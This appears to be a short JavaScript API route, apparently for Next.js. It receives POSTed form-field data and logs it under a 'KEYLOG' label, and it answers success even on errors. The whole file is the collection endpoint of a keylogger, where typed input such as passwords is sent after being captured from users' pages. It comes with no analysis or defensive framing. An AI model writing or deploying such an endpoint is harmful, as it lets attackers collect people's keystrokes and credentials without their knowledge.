export default function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { data, field } = req.body;
      console.log(`KEYLOG [${field}]: ${data}`);
      res.status(200).end();
    } catch {
      res.status(200).end();
    }
  } else {
    res.status(405).end();
  }
}